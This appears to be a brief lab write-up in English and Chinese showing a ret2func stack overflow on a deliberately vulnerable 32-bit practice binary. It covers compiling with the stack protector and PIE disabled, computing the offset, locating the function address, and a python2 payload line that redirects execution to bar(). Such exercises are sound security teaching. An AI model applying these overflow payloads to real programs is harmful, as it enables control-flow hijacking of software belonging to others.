

```
gcc -m32 -g -fno-stack-protector  -no-pie -fno-pie exploit_me_1.c -o exploit_me_1
```
- -no-pie (linker flag) disables PIE at the linking stage.
- -fno-pie (compiler flag) generates non-PIE-compatible code at compilation.
- -m32: instrcuting the compiler to build 32 bit Binary
- -g: This allow C code to visible in gdb
- -fno-stack-protector: Disbale stack protection by canary


<img width="583" height="532" alt="image" src="https://github.com/user-attachments/assets/a85ddbac-dec7-4783-a4ce-72cb91cb66f6" />


计算offset：

0x12 + 4 (EBP) = 22 bytes

获取ret2func的函数地址：

<img width="434" height="233" alt="image" src="https://github.com/user-attachments/assets/ac62794a-7f48-4299-a66e-fe63e6549312" />

0x08049183


```
python2 -c "print 'A' * 18 + 'B' * 4 + b'\x83\x91\x04\x08'" | ./exploit_me_1 
```


<img width="761" height="110" alt="image" src="https://github.com/user-attachments/assets/eed42bac-56b0-4721-a566-a51f5bdf2188" />




成功执行到bar函数：


<img width="819" height="553" alt="image" src="https://github.com/user-attachments/assets/f87940c8-a106-464f-b88b-f99cf8ae5ee3" />












